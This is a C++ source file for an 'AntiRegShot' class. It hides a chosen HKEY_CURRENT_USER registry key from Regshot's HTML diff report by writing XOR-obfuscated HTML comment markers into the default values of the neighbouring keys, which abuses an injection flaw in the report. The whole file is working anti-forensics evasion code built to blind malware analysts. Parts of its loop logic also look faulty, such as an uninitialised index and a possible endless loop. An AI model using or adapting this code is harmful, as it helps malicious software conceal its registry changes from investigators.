#include "stdafx.h"
#include "AntiRegShot.h"
#include "Debug.h"

AntiRegShot::AntiRegShot(HKEY key, std::wstring keyName)
{
	//init XSS strings
	XorS(OPEN, "><!--");
	XorS(CLOSE, "-->");
	this->xssComment_open = OPEN.decrypt();
	this->xssComment_close = CLOSE.decrypt();

	//Parse Path/Key
	std::wstring *pathFile;
	this->targetKey.key = key;
	pathFile = SplitPathFile(keyName);
	if (pathFile == NULL)
		return;
	
	//Init Path/Key
	this->targetKey.path = pathFile[0];
	this->targetKey.keyName = pathFile[1];
	delete[] pathFile;
}


AntiRegShot::~AntiRegShot()
{
}

std::wstring ToUpper(std::wstring s)
{
	std::transform(s.begin(), s.end(), s.begin(), ::toupper);
	return s;
}

//Given a full path, splits path/filename by returning 2D string array
//[0] = Path
//[1] = File
std::wstring *AntiRegShot::SplitPathFile(std::wstring fullKeyPath)
{
	//remove trailing slash in path
	if (fullKeyPath.at(fullKeyPath.length()-1) == '\\')
		fullKeyPath.pop_back();
	std::wstring *ret = new std::wstring[2];
	
	size_t slashPos = fullKeyPath.rfind('\\');
	if (slashPos == std::string::npos)
		return NULL;
	ret[0] = fullKeyPath.substr(0, slashPos);
	ret[1] = fullKeyPath.substr(slashPos+1, fullKeyPath.length());
	return ret;
}

//Hides target regkey via XSS vuln in HTML output of regshot diff
//Searches Hive for target regkey, decrements to previous regkey - writes opening XSS HTML open comment "><!--"
//Finds next writable regkey after target - writes closing XSS HTML comment "-->"
bool AntiRegShot::HideKeyHTML()
{
	HKEY outKey,innerKey;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, 
					std::wstring(this->targetKey.path).c_str(), 
					NULL, 
					KEY_READ | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE, 
					&outKey))
	{
#ifdef DEBUG
		DebugOut(L"Unable to open regkey");
#endif
		return false;
	}

	bool hasOpeningComment = false, firstPass = true;
	int lastKey;
	for (int Index = 0; ; Index++)
	{
		wchar_t sKey[MAX_PATH],sVal[MAX_PATH],prevKey[MAX_PATH];
		BYTE data[2096];
		DWORD type, size = MAX_PATH, valueSize = 2096;
		
		if (RegEnumKeyEx(outKey, Index, sKey, &size, NULL, NULL, NULL, NULL) == ERROR_NO_MORE_ITEMS)
			return true; //Exit if key enumeration done

		RegOpenKey(outKey, sKey, &innerKey);
		size = MAX_PATH;
		while (!RegEnumValue(innerKey, 0, sVal, &size, NULL, &type, NULL,NULL))
		{
			if (type != REG_SZ)
				continue;
			if (ToUpper(std::wstring(sKey)) == ToUpper(this->targetKey.keyName) && firstPass)
			{
				HKEY writeKey;
				size = MAX_PATH;
				RegEnumKeyEx(outKey, lastKey, prevKey, &size, NULL, NULL, NULL, NULL);
				RegOpenKey(outKey, prevKey, &writeKey);
				//Write to default key
				if (!RegSetValue(writeKey, L"", REG_SZ, this->xssComment_open.c_str(), NULL))
				{
#ifdef DEBUG
					DebugOut(std::wstring(L"RegKey|ValueSet -- ") + std::wstring(prevKey) + L"|" + this->xssComment_open);
#endif // DEBUG

					firstPass = false;
				}

			}
			else if(ToUpper(std::wstring(sKey)) != ToUpper(this->targetKey.keyName) && !firstPass)
			{
				//Write to default key
				if (!RegSetValue(innerKey, L"", REG_SZ, this->xssComment_close.c_str(),NULL))
				{
#ifdef DEBUG
		DebugOut(std::wstring(L"RegKey|ValueSet -- ") + std::wstring(sKey) + L"|" + this->xssComment_close);
#endif // DEBUG
					return true;
				}
			}

			lastKey = Index;
		}
	}
}